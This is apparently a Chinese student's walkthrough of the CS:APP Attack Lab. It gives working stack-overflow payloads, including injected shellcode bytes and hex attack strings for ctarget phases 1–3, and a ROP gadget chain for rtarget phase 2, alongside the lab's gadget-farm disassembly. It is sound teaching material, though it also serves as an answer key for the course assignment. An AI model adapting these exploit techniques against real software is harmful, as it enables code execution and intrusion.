### 简介

`Attack Lab`的内容针对的是`CS-APP`中第三章中关于程序安全性描述中的栈溢出攻击。在这个`Lab`中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中`IA32`编写的`Buffer Lab`的替代。

我们可以从[`CMU`的`lab`主页](http://csapp.cs.cmu.edu/3e/labs.html)来获取自学者版本与实验讲义(Writeup)，讲义中包含了必要的提示、建议与被禁止的操作，从这个`lab`开始之后的`lab`对讲义中内容的依赖还是很强的。

> **特别提示** 本`lab`的自学者版本需要在运行程序时加上`-q`参数来避免程序向不存在的评分服务器提交我们的答案导致报错

# Attack Lab

```
This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.

```

## 前置

讲义中首先给我们展示了导致程序漏洞的关键：`getbuf`函数。

```
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

`getbuf`函数在栈中申请了一块`BUFFER_SIZE`大小的空间，然后利用这块空间首地址作为`Gets`函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过`BUFFER_SIZE`的字符串来向`getbuf`的栈帧之外写入数据。

在代码注入攻击中就是利用函数返回时`RET`指令会将调用方在栈中存放的返回地址读入`IP`中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。

![image-20211218204318336](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218204318336.png)

## 第一部分：代码注入攻击

这里放入知乎的链接，里面栈有清晰的图

https://zhuanlan.zhihu.com/p/339802171

### level1

http://csapp.cs.cmu.edu/3e/attacklab.pdf

这个是我们从attacklab.pdf里面找的

![image-20211218151859547](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218151859547.png)

![image-20211218151543234](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218151543234.png)

讲义中写的很明白，

在这个等级中，我们不需要注入任何攻击代码，只需要更改`getbuf`函数的返回地址执行指定的函数`touch1`（该函数已经存在于程序中）。

那么我们需要做的就是将栈中存放返回地址的位置改为`touch1`函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。

如果攻击成功，我们不会执行到第五行，而是跳转到`touch1`中执行

```
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

当然，gdb也可以直接进行汇编

```
disas getbuf
```



![image-20211218161844669](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218161844669.png)

或者我们选用，`objdump -d`

![image-20211218161920428](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218161920428.png)

我们可以看到，他首先开辟了0x28，也就是40个字节的空间。，我们猜测BUFFER_SIZE的大小就是0x28，我们的栈有40个字节的空间，然后他callq 401a40 调用gets函数，获取我们输入的字符串，然后%eax赋值0x1，然后保持栈平衡，%%rsp+0x28



```
disas touch1
```

![image-20211218162210180](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218162210180.png)

也就是说，我们的ret的返回地址为`0x00000000004017c0`，我们知道这些信息就可以进行攻击了

![image-20211218165713826](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218165713826.png)

这个是ret和call指令对栈的操作，

![image-20211218172326582](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218172326582.png)

因为我们的栈帧是这样的，参数完之后就是返回地址，

现在我们可以知道，我们需要用0x28字节来将栈填满，再写入`touch1`函数的入口地址，在`getbuf`函数执行到`ret`指令的时候就会返回到`touch1`中执行。

![image-20211218174419572](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218174419572.png)

栈由高地址，向低地址扩展的

![image-20211218185649996](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218185649996.png)

跟栈一样，先进后出，我们，将他的局部变量放在了，最低端，栈顶，然后从下面往上增长，可以覆盖返回地址，

![image-20211218192923243](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218192923243.png)

那么，他touch的返回地址是4017c0

因为是小端存储，所以我们存储的时候，首先肯定是40个字节的空间，也就是0x28个

可以看到前0x28个字节都使用0x00来填充，然后在溢出的8个字节中写入了`touch1`的首地址`0x4017c0`，注意字节序就可以了。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00
```

我们使用	hex2raw生成我们输入的东西

```
./hex2raw < 1.txt | ./ctarget -q
```

![image-20211218201603084](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218201603084.png)



### level2

第二关，我们需要返回到touch2函数，0x00000000004017ec



我们在讲义中找到touch2代码

![image-20211218205258393](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218205258393.png)

```
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

这里提到了cookie，这里的cookie应该是服务器返回的，这里的我们cookie是默认不变的

可以看到`touch2`拥有一个参数，只有这个参数与`cookie`的值相等才可以通过这一等级。所以我们的目标就是让程序去执行我们的代码，设置这个参数的值，再调用`touch2`完成攻击。

![image-20211218204846810](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218204846810.png)

我们对代码进行分析，首先开辟栈空间，0x8

然后给%edx赋值  %edi

也就是说，这里我们传入的参数赋值给了%edi，我们也就是要设置这个寄存器等于cookie

既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令



再令从`getbuf`函数返回的地址为我们栈中指令的首地址，在指令中执行`ret`进行第二次返回，返回到`touch2`函数，就可以实现我们的目的。

也就是说，

![image-20211218210649728](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218210649728.png)



我的cookie是0x59b997fa

ret相当于 pop %rip 也就是相当于首先rsp 赋值rip然后跳转到相关的地址中去，

因为我们可控0x28个空间，所以我们可以写代码，也没必要去覆盖返回了，直接在他前面加一个ret就可

鸠占鹊巢 那味儿了

```
mov $0x59b997fa,%rdi
pushq $0x4017ec//这里也就相当于给rsp赋值了
ret


======================
mov $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

![image-20211218215803517](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218215803517.png)

首先我们，gcc -c 12.s -o 12.o

然后objdump -d 12.o

![image-20211218220059089](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218220059089.png)

![image-20211218220106634](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218220106634.png)

我们的shellcode就是

```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
```



```cpp
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28           sub    $0x28,%rsp
  4017ac: 48 89 e7              mov    %rsp,%rdi
  4017af: e8 8c 02 00 00        callq  401a40 <Gets>
  4017b4: b8 01 00 00 00        mov    $0x1,%eax
  4017b9: 48 83 c4 28           add    $0x28,%rsp
  4017bd: c3                    retq   
  4017be: 90                    nop
  4017bf: 90                    nop
```

我们在rsp把值给出去后打一个断点，也就是b *0x4017ac

disas 反汇编当前函数

![image-20211218220719240](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218220719240.png)

stepi 就是单步步入，也就是si

p变量名，也就是print

打印rsp中的值

也就是0x5561dc78

我们为什么需要这个值呢？

为了保证我们输入的能够执行

![image-20211218221628876](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218221628876.png)

可以看到首地址为`0x5561dc78`，顺便看到第6行也就是0x28个字节之后存放的原返回地址。

````
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
````

这里我写的和大多数的不同，大多数答案可能还有原来的rsp地址，但是我觉得程序流已经走完了，被劫持之后走完了，并不明白

![image-20211218223855234](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211218223855234.png)

### tips

上面并没有通过样例，因为我们没有返回输入，我们最终的结果都没有进行输入，因此，我们这里需要把rsp的值填写进去

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00

```

也就是这样的，这样才能够正确的保证输入

这里并不是Rop，我们需要完整的流程，为什么需要恢复rsp的初始值呢？

要保证栈平衡

![image-20211222170547443](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222170547443.png)

### level3

我们从提纲中，把level3的代码复制出来



![image-20211220220424113](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211220220424113.png)

```
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

```

我们需要传入`touch3`的参数是一个字符串的首地址

这个地址指向的字符串需要与`cookie`的字符串表示相同

![image-20211220220757228](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211220220757228.png)

![image-20211220220802887](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211220220802887.png)

![image-20211220221813503](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211220221813503.png)

`char *s = cbuf + random() % 100;`

使检查字符串的位置不可预测，

`%.8x ` 取8位字符串，x是以无符号16进制

然后`strncmp(sval, s, 9) == 0;`

他会比较cookie和第二个参数的前9位

```c
 // cookie只有8字节。这里为9的原因是我们要比较最后一个是否为'\0'
```

```c
 sprintf(s, "%.8x", val); //s=val=cookie
```

这句就是赋值，s赋值8个val，val本身就是cookie

![image-20211222164850271](../../AppData/Roaming/Typora/typora-user-images/image-20211222164850271.png)

我们来看touch3

```
void touch3(char *sval)
 {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) { //相同则成功
         printf("Touch3!: You called touch3(\"%s\")\n", sval);
         validate(3);
    } else {
         printf("Misfire: You called touch3(\"%s\")\n", sval);
         fail(3);
     }
    exit(0);
 }
```

也就是说， 我们需要在getbuf之后，执行touch3，同时传递cookie作为参数

strnmp是按照ascii码进行比对的，

cookie读取进去是`59b997fa\0`的字符串，也就是字符串转ascii，（注意是需要2进制或者是16进制的读取）



字符串如何转ascii呢？

首先字符串他都有对应的ascii码，但是在计算机中存储的都是二进制，因此表示的时候需要使用16进制进行表示，因此我们输入的，都是他的16进制，

`https://www.sojson.com/ascii.html`



0x59b997fa

```
35 39 62 39 39 37 66 61
```

既然这样，我们就可以将他的首地址给了%rdi，

rdi也就是目的地址寄存器

我们也就是说，需要把这串字符串放在栈中，同时rdi的值设置成为字符串的首地址，然后和level2 一样，	二次返回即可



如果目标字符串存放的位置比`touch3`存放地址更低，在最终字符串对比的时候会发现`rdi`指向地址的内容发生了改变。

 因为栈是从高地址向低地址增长的，所以，如果touch向低地址增长，很容易覆盖rdi，

因此，我们需要注入我们的代码

gcc -c 3.s -o 3.o

```
mov $0x5561dca8,%rdi
pushq $0x4018fa
retq
```

我们使用

objdump -d 3.p

```

3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq
```

因此我们输入的是：0x4018fa

touch 3 地址为：![image-20211222164903249](../../AppData/Roaming/Typora/typora-user-images/image-20211222164903249.png)

````
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
````

根据上图

rsp  = 5561dc78+0x28 然后到了00 00 00 00

然后返回地址是 78 dc 61 55 00 00 00 00

rdi是栈中 5561dc78+0x28+0x8

也就是开头是 35 39 62 39 39 37 66 61

因此，这样就可以将栈中的数据读取出来了

![image-20211222172438905](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222172438905.png)

## 第二部分：返回导向编程ROP

### 前言

我们在第二部分中需要解决的同样是第一部分的后两个问题，只不过我们要采取不同的方式来进行攻击。

为什么我们之前采取的代码注入的攻击手段无法在这个程序中起作用呢？这是国因为这个程序对代码注入攻击采取了两种防护方式：

![image-20211222205643275](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222205643275.png)

- 栈随机化，使得程序每次运行时栈的地址都不相同，我们无法得知我们注入的攻击代码的地址，也无法在攻击代码中硬编码栈中的地址。
- 标记内存中的栈段为不可执行，这意味着注入在栈中的代码无法被程序执行。

尽管这两种手段有效地避免了代码注入攻击，但是我们仍然可以找到方式让程序执行我们想要去执行的指令。

### 攻击方式

现在我们无法使用栈来存放代码，但是我们仍可以设置栈中的内容。不能注入代码去执行，我们还可以利用程序中原有的代码，利用`ret`指令跳转的特性，去执行程序中已经存在的指令。具体的方式如下：

我们可以在程序的汇编代码中找到这样的代码：

```
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

这段代码的本意是

```
void setval_210(unsigned *p)
{
    *p = 3347663060U;
}
```

这样一个函数，但是通过观察我们可以发现，汇编代码的最后部分：`48 89 c7 c3`又可以代表

```
movq %rax, %rdi
ret
```

这两条指令（指令的编码可以见讲义中的附录）。

第1行的`movq`指令可以作为攻击代码的一部分来使用，那么我们怎么去执行这个代码呢？我们知道这个函数的入口地址是`0x400f15`，这个地址也是这条指令的地址。我们可以通过计算得出`48 89 c7 c3`这条指令的首地址是`0x400f18`，我们只要把这个地址存放在栈中，在执行`ret`指令的时候就会跳转到这个地址，执行`48 89 c7 c3`编码的指令。同时，我们可以注意到这个指令的最后是`c3`编码的是`ret`指令，利用这一点，我们就可以把多个这样的指令地址依次放在栈中，每次`ret`之后就会去执行栈中存放的下一个地址指向的指令，只要合理地放置这些地址，我们就可以执行我们想要执行的命令从而达到攻击的目的。

![image-20211222205231155](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222205231155.png)

这样的一串以`ret`结尾的指令，被称为`gadget`。我们要攻击的程序中为我们设置了一个`gadget_farm`，为我们提供了一系列这样可以执行的攻击指令，同时我们也只被允许使用程序中`start_farm`与`end_farm`函数标识之间的`gadget`来构建我们的攻击字符串。

这种攻击方式被称为返回导向编程攻击。



#### level2

**题目本身与Ctarget一致, 区别在于源代码编译的过程中使用了ASLR与禁止栈执行. 笔记中前缀 R 以示区分.**

首先，我们所有的gadgets 都可以在rtarget中找到，所以肯定优先反编译rtarget

限制：我们只能使用两个gadgets

当一个小`gadgets`使用`pop`指令。你的`exploit string`中必须含有一个地址和`data`

![image-20211222210707493](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222210707493.png)

![image-20211222210930531](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222210930531.png)

### gadget表

```
target:     file format elf64-x86-64

Disassembly of section .init:

0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```

#### level2-续

文档提供了给了一些对于汇编代码的`encoding`例子

![image-20211222210948823](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222210948823.png)

![image-20211222210956606](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222210956606.png)

![image-20211222211001747](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222211001747.png)

![image-20211222211008973](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222211008973.png)

这个是rtarget里面的touch2函数



````
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 3c 20 00 02 	movl   $0x2,0x203ce0(%rip)        # 6054dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 3c 20 00    	cmp    0x203ce2(%rip),%edi        # 6054e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be 08 32 40 00       	mov    $0x403208,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 8b 05 00 00       	callq  401dad <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 30 32 40 00       	mov    $0x403230,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 2d 06 00 00       	callq  401e6f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
````

当然和我们之前的完全一样

```
 void touch2(unsigned val)
 {
 vlevel = 2; /* Part of validation protocol */
 if (val == cookie) {
   printf("Touch2!: You called touch2(0x%.8x)\n", val);
   validate(2);
     } else {
 printf("Misfire: You called touch2(0x%.8x)\n", val);
 fail(2);
    }
 exit(0);
 }
```

也就是说，我们需要给他一个cookie值，也即是说要给他的%rdi赋值，

根据上面的popq

我们发现，

![image-20211222211612443](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222211612443.png)



`popq 5f` 

代表的就是popq %rdi，让rdi中的值出栈

我们需要将cookie存入栈中，然后使用pop指令将cookie指令存入%rdi寄存器中

我们现在的目的就是为了找出给rdi赋值的，同时，带ret的，因为ret会去接着用栈，对吧，

![image-20211222214910289](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222214910289.png)

我们找到了5f，但是不满足要求，不是最基本的寄存器，

我们曲线救国，找找rdi试试

```
00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:       c3						retq  

00000000004019ca <getval_280>:
  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:       c3                      retq   
```

```
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq  
/*
起始于0x4019cc
58 : pop $rax 
90 : nop
c3 : retq
*/
```

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
/*
起始于0x4019c5
48 89 c7 : mov $rax,$rdi
90 : nop
c3 : retq
*/
```



首先我们填满getbuf开满的空间

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00/*前0x28个空间*/
cc 19 40 00 00 00 00 00/*	pop %rax*/
fa 97 b9 59 00 00 00 00/*cookie*/
c5 19 40 00 00 00 00 00/*mov %rax,%rdi*/
ec 17 40 00 00 00 00 00/*touch2*/
```

首先我们走到pop %rax，将cookie赋值给了rax，然后接着紧跟着c3 执行了ret，然后我们又回到了栈中，mov %rax,%rdi，把我们的rax赋值给了rdi，然后ret到了地址中



![image-20211222215811034](https://gitee.com/dingpengs/image/raw/master/imgwin/image-20211222215811034.png)

#### level3

目标字符串毫无疑问还是存放在栈中的，但是我们如何在栈地址随机化的情况下去获取我们放在栈中的字符串的首地址呢？

这个是最难的一个

参考

https://www.viseator.com/2017/07/18/CS_APP_AttackLab/